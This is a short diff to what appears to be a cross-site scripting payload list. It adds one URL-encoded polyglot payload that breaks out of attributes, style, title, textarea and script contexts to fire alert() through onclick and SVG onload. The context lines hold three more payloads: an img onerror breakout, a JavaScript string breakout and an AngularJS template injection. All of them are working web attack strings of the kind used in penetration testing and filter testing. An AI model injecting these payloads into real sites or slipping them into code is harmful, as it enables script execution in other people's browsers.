@@ -1,3 +1,4 @@
+%3Cinput%20type=text%20value=jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e%3E%3C/input%3E
 "></select><img%20src=1%20onerror=alert(1)>
 \"-alert(1)}//
 {{$on.constructor('alert(1)')()}}
